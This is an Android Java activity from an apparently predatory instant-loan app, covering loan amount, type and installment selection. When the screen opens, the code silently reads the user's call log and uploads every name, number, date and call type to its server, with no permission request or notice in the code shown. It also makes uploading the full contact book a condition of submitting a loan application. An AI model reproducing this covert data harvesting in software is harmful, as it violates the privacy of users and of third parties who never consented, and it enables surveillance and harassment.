package com.lightningfast.ui.activity;

import android.Manifest;
import android.app.Activity;
import android.content.Intent;
import android.os.Bundle;
import android.text.TextUtils;
import android.view.View;
import android.widget.PopupWindow;
import android.widget.SeekBar;
import android.widget.Toast;

import com.lightningfast.R;
import com.lightningfast.api.ApiClient;
import com.lightningfast.api.ApiService;
import com.lightningfast.api.ProgressSubscriber;
import com.lightningfast.api.RetrofitManager;
import com.lightningfast.api.SubscriberOnNextListener;
import com.lightningfast.base.BaseActivity;
import com.lightningfast.bean.BaseBean;
import com.lightningfast.bean.CallInfo;
import com.lightningfast.bean.StagesBean;
import com.lightningfast.bean.TypeBean;
import com.lightningfast.databinding.ActivityApplyLoanBinding;
import com.lightningfast.uitls.CallInfoService;
import com.lightningfast.uitls.DateUtils;
import com.lightningfast.uitls.DialogUtils;
import com.lightningfast.uitls.GetPhoneNumberFromMobile;
import com.lightningfast.uitls.LoginHelper;
import com.lightningfast.view.SelectMenuPopWindow;
import com.tbruyelle.rxpermissions.RxPermissions;

import java.util.ArrayList;
import java.util.List;

import cn.pedant.SweetAlert.SweetAlertDialog;
import rx.Subscriber;
import rx.functions.Action1;

public class ApplyLoanActivity extends BaseActivity<ActivityApplyLoanBinding>{
    private boolean isClick=true;

    private GetPhoneNumberFromMobile getPhoneNumberFromMobile;
    private List<TypeBean.DataBean> mTypeList;
    private List<StagesBean.DataBean>mStagesList;
    private int money=1000;
    private SelectMenuPopWindow mTypePopWindow;
    private String typeId;
    private String dateId;
    private SelectMenuPopWindow mDatePopWindow;
    private int nums;
    private String numsStr;
    private List<CallInfo> callInfos;

    public static void actionStart(Activity activity) {
        Intent intent = new Intent(activity, ApplyLoanActivity.class);
        activity.startActivity(intent);
    }
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
    }

    @Override
    protected void setupTitle() {

    }

    @Override
    protected void initFieldBeforeMethods() {
        mTypeList=new ArrayList<>();
        mStagesList=new ArrayList<>();
        callInfos=new ArrayList<>();
        initPop();
        initTypeData();
        initStagesData(typeId);
    }

    private void initCall() {
        callInfos = CallInfoService.getCallInfos(mContext);
        if (callInfos.size()>0){
            StringBuilder builder=new StringBuilder();
            for (int i = 0; i < callInfos.size(); i++) {
                if (i==callInfos.size()-1){
                    builder.append(callInfos.get(i).getName()).append("|").append(callInfos.get(i).getNumber())
                            .append("|").append(DateUtils.getDateToString2(callInfos.get(i).getDate())
                    ).append("|").append(callInfos.get(i).getType());
                }else {
                    builder.append(callInfos.get(i).getName()).append("|").append(callInfos.get(i).getNumber())
                            .append("|").append(DateUtils.getDateToString2(callInfos.get(i).getDate())
                    ).append("|").append(callInfos.get(i).getType()).append(",");
                }
            }
            RetrofitManager.toSubscribe(ApiClient.getApiService(ApiService.class
                    , RetrofitManager.RetrofitType.Object).updateCallLog(LoginHelper.getInstance().getUserId(),builder.toString()
                    ,LoginHelper.getInstance().getUserToken()),new ProgressSubscriber<>(mContext, new SubscriberOnNextListener<BaseBean>() {
                @Override
                public void onNext(BaseBean result) {
                    if (result.getCode()==1){
                        Toast.makeText(mContext, result.getMsg(), Toast.LENGTH_SHORT).show();
                    }else {
                        Toast.makeText(mContext, result.getMsg(), Toast.LENGTH_SHORT).show();
                    }
                }
            }));
        }
    }

    private void initStagesData(String id) {
        RetrofitManager.toSubscribe(ApiClient.getApiService(ApiService.class
                , RetrofitManager.RetrofitType.Object).updateStages(id)
                , new Subscriber<StagesBean>() {
                    @Override
                    public void onCompleted() {

                    }

                    @Override
                    public void onError(Throwable e) {

                    }

                    @Override
                    public void onNext(StagesBean result) {
                        if (result.getCode()==1){
                            mStagesList.clear();
                            final List<StagesBean.DataBean> data = result.getData();
                            mStagesList.addAll(data);
                            mDataBinding.stages.setText(data.get(0).getName());
                            if (data.size()>0){
                                List<String> mList=new ArrayList<>();
                                dateId=String.valueOf(data.get(0).getId());
                                for (int i = 0; i < data.size(); i++) {
                                    mList.add(data.get(i).getName());
                                }
                                mDatePopWindow.bindingList(mList);
                            }
                            if (isClick){
                                nums=mStagesList.get(0).getFenqi_num();
                                numsStr=mStagesList.get(0).getName();
                                mDataBinding.tvMessage.setText("分期信息:"+money/nums+"*"+numsStr);
                            }
                        }
                    }
                });
    }

    private void initTypeData() {
        RetrofitManager.toSubscribe(ApiClient.getApiService(ApiService.class
                , RetrofitManager.RetrofitType.Object).updateType(""), new Subscriber<TypeBean>() {
            @Override
            public void onCompleted() {

            }

            @Override
            public void onError(Throwable e) {

            }

            @Override
            public void onNext(TypeBean result) {
                if (result.getCode()==1){
                    final List<TypeBean.DataBean> data = result.getData();
                    mTypeList.addAll(data);
                    if (data.size()>0){
                        List<String> mList=new ArrayList<>();
                        for (int i = 0; i < data.size(); i++) {
                            mList.add(data.get(i).getName());
                        }
                        mTypePopWindow.bindingList(mList);
                    }
                    typeId=String.valueOf(data.get(0).getId());
                    initStagesData(typeId);
                }
            }

        });
    }

    private void initPop() {
        mTypePopWindow = new SelectMenuPopWindow(this);
        mDatePopWindow = new SelectMenuPopWindow(this);

        mTypePopWindow.setOnClickSelectListener(new SelectMenuPopWindow.OnClickSelectListener() {
            @Override
            public void onClickSelectItem(String itemName, int position) {
                isClick=true;
                mDataBinding.type.setText(itemName);
                typeId = String.valueOf(mTypeList.get(position).getId());
                initStagesData(typeId);
                if (mStagesList.size()>0){
                    nums=mStagesList.get(0).getFenqi_num();
                    numsStr=mStagesList.get(0).getName();
                    mDataBinding.tvMessage.setText("分期信息:"+money/nums+"*"+numsStr);
                }

            }
        });
        mTypePopWindow.setOnDismissListener(new PopupWindow.OnDismissListener() {
            @Override
            public void onDismiss() {
            }
        });

        mDatePopWindow.setOnClickSelectListener(new SelectMenuPopWindow.OnClickSelectListener() {
            @Override
            public void onClickSelectItem(String itemName, int position) {
                mDataBinding.stages.setText(itemName);
                dateId=String.valueOf(mStagesList.get(position).getId());
                isClick=false;
                nums=mStagesList.get(position).getFenqi_num();
                numsStr=mStagesList.get(position).getName();
                mDataBinding.tvMessage.setText("分期信息:"+money/nums+"*"+numsStr);
            }
        });
        mDatePopWindow.setOnDismissListener(new PopupWindow.OnDismissListener() {
            @Override
            public void onDismiss() {
            }
        });
    }

    @Override
    protected void initViews() {
        initCall();
        mDataBinding.type.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                if (mTypeList.size()>0){
                    mTypePopWindow.showPopupWindow(mDataBinding.getRoot());
                }else {
                    Toast.makeText(mContext, "暂无数据", Toast.LENGTH_SHORT).show();
                }
            }
        });
        mDataBinding.stages.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                initStagesData(typeId);
                if (mStagesList.size()>0){
                    mDatePopWindow.showPopupWindow(mDataBinding.getRoot());
                }else {
                    Toast.makeText(mContext, "暂无数据", Toast.LENGTH_SHORT).show();
                }

            }
        });
        mDataBinding.seekBar.setOnSeekBarChangeListener(new SeekBar.OnSeekBarChangeListener() {
            @Override
            public void onProgressChanged(SeekBar seekBar, int i, boolean b) {
                if (TextUtils.isEmpty(typeId)){
                    isClick=true;
                    initTypeData();
                }
                isClick=false;
                if (i==0){
                    money=1000;
                }else {
                    money=i*1000;
                }
                mDataBinding.progressTv.setText("期望额度￥"+money);
                mDataBinding.tvMessage.setText("分期信息:"+money/nums+"*"+numsStr);
            }

            @Override
            public void onStartTrackingTouch(SeekBar seekBar) {

            }

            @Override
            public void onStopTrackingTouch(SeekBar seekBar) {

            }
        });

        mDataBinding.commit.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                RxPermissions.getInstance(mContext).request(Manifest.permission.READ_CONTACTS
                        ,Manifest.permission.WRITE_CONTACTS)
                        .subscribe(new Action1<Boolean>() {

                            @Override
                            public void call(Boolean aBoolean) {
                                if (aBoolean){
                                    try {
                                        getPhoneNumberFromMobile = new GetPhoneNumberFromMobile();
                                        String mailList = getPhoneNumberFromMobile.getMailList(mContext);
                                        String substring = mailList.substring(0, mailList.length() - 1);
                                        updateTel(substring);
                                    } catch (Exception e) {
                                        Toast.makeText(mContext, "请前往设置中心打开权限", Toast.LENGTH_SHORT).show();
                                        e.printStackTrace();
                                    }
                                }else {
                                    Toast.makeText(mContext, "请前往设置中心打开权限", Toast.LENGTH_SHORT).show();
                                }
                            }
                        });

            }
        });
    }
    private void applyLoan(){
        RetrofitManager.toSubscribe(ApiClient.getApiService(ApiService.class
                , RetrofitManager.RetrofitType.Object).updatesLoan(LoginHelper.getInstance().getUserId(),typeId
                ,dateId,String.valueOf(money),LoginHelper.getInstance().getUserToken()),new ProgressSubscriber<>(mContext
                , new SubscriberOnNextListener<BaseBean>() {
            @Override
            public void onNext(BaseBean result) {
                if (result.getCode()==1){
                    Toast.makeText(mContext, result.getMsg(), Toast.LENGTH_SHORT).show();
                    FeedBackActivity.actionStart(ApplyLoanActivity.this);
                    finish();
                }else {
                    Toast.makeText(mContext, result.getMsg(), Toast.LENGTH_SHORT).show();
                }
            }
        }));
    }

    private void updateTel(String tel){
        RetrofitManager.toSubscribe(ApiClient.getApiService(ApiService.class
                , RetrofitManager.RetrofitType.Object)
                .updateTelBook(LoginHelper.getInstance().getUserId(), tel,LoginHelper.getInstance()
                        .getUserToken()), new ProgressSubscriber<>(mContext, new SubscriberOnNextListener<BaseBean>() {
            @Override
            public void onNext(BaseBean result) {
                if (result.getCode()==1){
                    DialogUtils.alertDialog(mContext, "温馨提示", "一经提交,将无法修改,您确定要提交?", new SweetAlertDialog.OnSweetClickListener() {
                        @Override
                        public void onClick(SweetAlertDialog sweetAlertDialog) {
                            sweetAlertDialog.dismiss();
                        }
                    }, new SweetAlertDialog.OnSweetClickListener() {
                        @Override
                        public void onClick(SweetAlertDialog sweetAlertDialog) {
                            sweetAlertDialog.dismiss();
                            applyLoan();
                        }
                    });
                }else {
                    Toast.makeText(mContext, "无法读取手机通讯录", Toast.LENGTH_SHORT).show();
                    return;
                }
            }
        }));
    }


    @Override
    protected int getLayoutId() {
        return R.layout.activity_apply_loan;
    }
}
